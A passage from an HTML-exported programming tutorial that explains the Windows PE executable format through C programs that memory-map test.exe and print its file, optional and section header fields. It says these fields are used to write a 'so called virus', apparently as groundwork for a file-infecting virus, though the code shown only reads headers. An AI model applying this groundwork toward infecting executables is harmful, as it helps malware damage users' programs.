= (IMAGE_FILE_HEADER *)(pmappedfile + pimagedosheader-&gt;e_lfanew +4);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Machine=%x\n&quot;,pimagefileheader-&gt;Machine);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;NumberOfSections=%d\n&quot;,pimagefileheader-&gt;NumberOfSections);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;TimeDateStamp=%d\n&quot;,pimagefileheader-&gt;TimeDateStamp);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;PointerToSymbolTable=%d\n&quot;,pimagefileheader-&gt;PointerToSymbolTable);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;NumberOfSymbols=%d\n&quot;,pimagefileheader-&gt;NumberOfSymbols);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;SizeOfOptionalHeader=%d\n&quot;,pimagefileheader-&gt;SizeOfOptionalHeader);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Characteristics=%x\n&quot;,pimagefileheader-&gt;Characteristics);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Output<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>PE 0 0<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>Machine=14c<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>NumberOfSections=3<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>TimeDateStamp=938257211<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>PointerToSymbolTable=0<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>NumberOfSymbols=0<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>SizeOfOptionalHeader=224<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>Characteristics=30f<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>In the next program, a variable called
dummy is created that points to the location where file test.exe is loaded in
memory. The value stored in e_lfanew which is 200 is then added to this
location. The first four bytes at this position refer to the signature of the
file. The output is signature of a PE file PE 00. All valid executables under
windows must start with this signature. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>After this magic number starts a
header or structure called Image File Header which is defined in the header
file winnt.h. The variable pimagefileheader is created to hold the start of
this structure and then all the members of the structure are displayed. The
first member is called Machine with a value of 0x14c. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>This means that the machine the
program is compiled on is either a 386 or a 486 or a 586. Each family of
microprocessors has it own unique value. For example a DEC alpha would have a
value of 0x183 and the MIPS 4000 0x166. At present, these machines are only
seen in museums. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>An exe file has different fragments like
code, data, resources etc. These different entities cannot be mixed up and
placed together. They require their own space for various reasons for eg, code
is executable whereas data is not. Thus different entities are placed in
different compartments or sections. The second member of the structure gives a
count on the sections in the file. A little later in this chapter, we will
display the details of every section. For now, we have three sections. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The next field is the number of
seconds from the 31<sup>st</sup> of December 1969 4 PM that this file was
created by the linker. The documentation does not give any details whether the
time shown is<span style="mso-spacerun: yes">  </span>when the linker started
creating the file or stopped creating. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The PE file format also applies to
obj files created by the complier and the next two fields deal with symbols
which is what the compiler understand. Just to clarify, every function to the
compiler is a symbol. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The second last field holds the size
of the next structure called the Image Optional Header which is 224. This
header follows the Image File Header.<span style="mso-spacerun: yes"> 
</span>The next example displays the members of this gigantic structure. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The last field gives some more
information about the exe file in a series of bits. If the first bit is on,
then there are no relocations in the file. Similarly the second bits decides
whether the file is an obj or an exe file etc. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>a.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>void main()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>HANDLE hfile,hfile1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>unsigned char *pmappedfile, *dummy;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile =
CreateFile(&quot;test.exe&quot;,GENERIC_WRITE |
GENERIC_READ,0,0,OPEN_EXISTING,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile1 = CreateFileMapping (hfile, 0,
PAGE_READWRITE, 0, 0, 0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pmappedfile = (unsigned char
*)MapViewOfFile(hfile1,FILE_MAP_ALL_ACCESS,0,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_DOS_HEADER
*pimagedosheader<span style="mso-spacerun: yes">  </span>= (IMAGE_DOS_HEADER
*)pmappedfile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>dummy = (unsigned char<span
style="mso-spacerun: yes">  </span>*)(pmappedfile +
pimagedosheader-&gt;e_lfanew);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_FILE_HEADER *pimagefileheader =
(IMAGE_FILE_HEADER *)(pmappedfile + pimagedosheader-&gt;e_lfanew +4);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_OPTIONAL_HEADER
*pimageoptionalheader = (IMAGE_OPTIONAL_HEADER *)((unsigned char
*)pimagefileheader+sizeof(IMAGE_FILE_HEADER));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Magic=%x\n&quot;,pimageoptionalheader-&gt;Magic);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;MajorLinkerVersion=%d\n&quot;,pimageoptionalheader-&gt;MajorLinkerVersion);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;MinorLinkerVersion=%d\n&quot;,pimageoptionalheader-&gt;MinorLinkerVersion);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;SizeOfCode=%ld\n&quot;,pimageoptionalheader-&gt;SizeOfCode);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;SizeOfInitializedData=%ld\n&quot;,pimageoptionalheader-&gt;SizeOfInitializedData);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;SizeOfUninitializedData=%ld\n&quot;,pimageoptionalheader-&gt;SizeOfUninitializedData);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;AddressOfEntryPoint=%x\n&quot;,pimageoptionalheader-&gt;AddressOfEntryPoint);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;BaseOfCode=%x\n&quot;,pimageoptionalheader-&gt;BaseOfCode);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;BaseOfData=%x\n&quot;,pimageoptionalheader-&gt;BaseOfData);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;ImageBase=%x\n&quot;,pimageoptionalheader-&gt;ImageBase);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;SectionAlignment=%x\n&quot;,pimageoptionalheader-&gt;SectionAlignment);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;FileAlignment=%x\n&quot;,pimageoptionalheader-&gt;FileAlignment);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;MajorOperatingSystemVersion=%d\n&quot;,pimageoptionalheader-&gt;MajorOperatingSystemVersion);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;MinorOperatingSystemVersion=%d\n&quot;,pimageoptionalheader-&gt;MinorOperatingSystemVersion);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;MajorImageVersion=%d\n&quot;,pimageoptionalheader-&gt;MajorImageVersion);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;MinorImageVersion=%d\n&quot;,pimageoptionalheader-&gt;MinorImageVersion);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;MajorSubsystemVersion=%d\n&quot;,pimageoptionalheader-&gt;MajorSubsystemVersion);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;MinorSubsystemVersion=%d\n&quot;,pimageoptionalheader-&gt;MinorSubsystemVersion);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Win32VersionValue=%d\n&quot;,pimageoptionalheader-&gt;Win32VersionValue);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;SizeOfImage=%d\n&quot;,pimageoptionalheader-&gt;SizeOfImage);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;SizeOfHeaders=%d\n&quot;,pimageoptionalheader-&gt;SizeOfHeaders);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;CheckSum=%d\n&quot;,pimageoptionalheader-&gt;CheckSum);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Subsystem=%d\n&quot;,pimageoptionalheader-&gt;Subsystem);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;DllCharacteristics=%x\n&quot;,pimageoptionalheader-&gt;DllCharacteristics);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;SizeOfStackReserve=%x\n&quot;,pimageoptionalheader-&gt;SizeOfStackReserve);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;SizeOfStackCommit=%x\n&quot;,pimageoptionalheader-&gt;SizeOfStackCommit);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;SizeOfHeapReserve=%x\n&quot;,pimageoptionalheader-&gt;SizeOfHeapReserve);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;SizeOfHeapCommit=%x\n&quot;,pimageoptionalheader-&gt;SizeOfHeapCommit);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;LoaderFlags=%d\n&quot;,pimageoptionalheader-&gt;LoaderFlags);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;NumberOfRvaAndSizes=%d\n&quot;,pimageoptionalheader-&gt;NumberOfRvaAndSizes);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>Magic=10b<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>MajorLinkerVersion=5<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>MinorLinkerVersion=12<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>SizeOfCode=75264<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>SizeOfInitializedData=15872<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>SizeOfUninitializedData=0<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>AddressOfEntryPoint=134ef<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>BaseOfCode=1000<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>BaseOfData=14000<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>ImageBase=1000000<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>SectionAlignment=1000<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>FileAlignment=200<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>MajorOperatingSystemVersion=5<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>MinorOperatingSystemVersion=0<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>MajorImageVersion=5<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>MinorImageVersion=0<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>MajorSubsystemVersion=4<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>MinorSubsystemVersion=0<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>Win32VersionValue=0<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>SizeOfImage=102400<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>SizeOfHeaders=1536<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>CheckSum=113241<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>Subsystem=2<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>DllCharacteristics=8000<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>SizeOfStackReserve=40000<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>SizeOfStackCommit=1000<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>SizeOfHeapReserve=100000<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>SizeOfHeapCommit=1000<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>LoaderFlags=0<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>NumberOfRvaAndSizes=16<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>This program displays the members of
the Image Optional Header which are used to write our so called virus. The header
starts after the Image File Header, so the size of Image File header is added
to the pointer that points to the start of the Image file header. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>A short description of some of the
fields. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>This header starts with its own magic
number, 0x10b. This is followed by the major and minor number of the linker
that produced the exe file. In our case it is 12.5. Then comes the size of code
in bytes<span style="mso-spacerun: yes">  </span>present in the file, 75264.
The size of Initialized data is meant for variables that have been initialized.
The size of UnInitialized data is the space taken in memory when the file is
loaded but no space is reserved for the file on disk.<span style="mso-spacerun:
yes">  </span>The next field is the most crucial one called the entry point.
This field has an address which is presently a value of<span
style="mso-spacerun: yes">  </span>0x134ef. This is the address of the first
instruction that will be executed in memory. This field is defined to be an RVA
or a relative virtual address. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The operating system has not been
given any instruction as to where it should load the program in memory. However
it uses the value stored in the field called ImageBase, which in our case is
1000000. Once it identifies this position, the loader then jumps to </span><span
style='font-size:10.0pt;font-family:"Trebuchet MS";mso-fareast-font-family:
"MS Mincho";color:#000066'>address </span><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>0x134ef, base of code, from this
image base to execute the first instruction. This instruction actually is thus
stored at </span><span style='font-size:10.0pt;font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>1000000 plus 0x134ef, i.e.
0x10134ef. Thus to calculate the actual address we add the Image Base to the
RVA. An RVA is always an address from the Image base. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";mso-fareast-font-family:"MS Mincho";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";mso-fareast-font-family:"MS Mincho";color:#000066'>The
Base Of code holds the address of the code in memory, and this value is also
given in the section table. The next field Base of Data is about the data
section when loaded in memory which again is available in the section headers. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";mso-fareast-font-family:"MS Mincho";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";mso-fareast-font-family:"MS Mincho";color:#000066'>The
section alignment refers to the start of section in memory. In windows, the
section alignment is usually 4096 bytes which means that every section will
begin in memory at multiple of 4096. Thus if the code section is 90 bytes, then
the data section to follow will begin 4006 bytes later and the memory area in
the middle will be left unused. The file alignment is normally the sector size
i.e. 512 bytes. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";mso-fareast-font-family:"MS Mincho";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";mso-fareast-font-family:"MS Mincho";color:#000066'>Each
section on disk begins on a new sector, so even when a section is 5 bytes large
the remaining 507 bytes are yet kept allocated for the same though unused. The
rest of the fields are of academic interest to us as of now. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";mso-fareast-font-family:"MS Mincho";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";mso-fareast-font-family:"MS Mincho";color:#000066'>a.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>struct section {<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>BYTE<span style="mso-spacerun:
yes">    </span>Name[8];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD<span style="mso-spacerun:
yes">   </span>VirtualSize;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD<span style="mso-spacerun:
yes">   </span>VirtualAddress;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD<span style="mso-spacerun:
yes">   </span>SizeOfRawData;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD<span style="mso-spacerun:
yes">   </span>PointerToRawData;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>char a[16];<span style="mso-spacerun:
yes">    </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>void main()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
